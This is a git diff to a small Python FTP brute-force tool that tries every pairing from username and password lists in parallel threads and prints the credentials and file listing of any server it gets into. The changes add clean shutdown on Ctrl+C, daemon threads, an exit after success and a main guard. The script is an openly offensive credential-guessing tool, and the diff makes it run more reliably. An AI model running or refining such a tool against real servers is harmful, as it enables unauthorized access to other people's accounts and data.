@@ -1,6 +1,8 @@
-import threading, argparse, time
+import threading, argparse, time, sys, signal
 from datetime import datetime
 from ftplib import FTP
+
+
 
 
 def login(host, user, passw, ptime):
@@ -24,6 +26,8 @@ def login(host, user, passw, ptime):
 [PASSWORD]   >   {passw}
 [FILES]      >   {files}
             """)
+            exit()
+            sys.exit(0)
 
 
     except:
@@ -40,6 +44,10 @@ def load_usernames(file):
         return [username for username in f.read().splitlines()]
 
 
+
+def handler(sig, frame):
+    print("\n[DEBUG] > CTRL + C WAS SIGNALLED")
+    sys.exit(0)
 
 
 def main():
@@ -73,9 +81,13 @@ def main():
 
         for username in usernames:
             for password in passwords:
-                threading.Thread(target=login, args=[args.target, username, password, time.time()]).start()
+                t = threading.Thread(target=login, args=[args.target, username, password, time.time()])
+                t.daemon = True
+                t.start()
+    else:
+        print("[DEBUG] > PLEASE SUPPLY A TARGET")
 
 
-
-main()
-#login("test.rebex.net", "demo", "password")
+if __name__ == "__main__":
+    signal.signal(signal.SIGINT, handler)
+    main()
